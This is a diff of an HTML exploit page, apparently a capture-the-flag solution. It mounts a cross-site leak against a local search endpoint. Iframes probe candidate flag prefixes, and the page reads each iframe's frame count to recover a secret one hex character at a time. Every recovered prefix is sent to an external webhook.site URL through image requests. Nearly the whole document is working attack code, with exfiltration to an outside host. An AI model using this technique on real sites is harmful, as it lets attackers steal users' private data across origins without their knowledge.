@@ -2,22 +2,34 @@
 <body>
 <script>
 var WH = "https://webhook.site/8088a9e6-c7fe-4518-ad97-fa0c73431f5f";
-var known = "DH{";
+var known = "DH{2";
 var chars = "0123456789abcdef";
+var round = 0;
 
-for (var i = 0; i < chars.length; i++) {
-  (function(c) {
-    var iframe = document.createElement("iframe");
-    iframe.src = "http://127.0.0.1:8000/search?query=" + encodeURIComponent(known + c);
-    iframe.onload = function() {
-      var len = iframe.contentWindow.length;
-      if (len > 0) {
-        new Image().src = WH + "?hit=" + c + "&known=" + encodeURIComponent(known + c);
-      }
-    };
-    document.body.appendChild(iframe);
-  })(chars[i]);
+function findNext() {
+  if (round >= 4) return;
+  for (var i = 0; i < chars.length; i++) {
+    (function(c) {
+      var iframe = document.createElement("iframe");
+      iframe.src = "http://127.0.0.1:8000/search?query=" + encodeURIComponent(known + c);
+      iframe.onload = function() {
+        try {
+          if (iframe.contentWindow.length > 0) {
+            known += c;
+            round++;
+            new Image().src = WH + "?round=" + round + "&known=" + encodeURIComponent(known);
+            // 다음 글자 찾기
+            findNext();
+          }
+        } catch(e) {}
+        document.body.removeChild(iframe);
+      };
+      document.body.appendChild(iframe);
+    })(chars[i]);
+  }
 }
+
+findNext();
 </script>
 <img src="http://192.0.2.1:1/delay">
 </body>
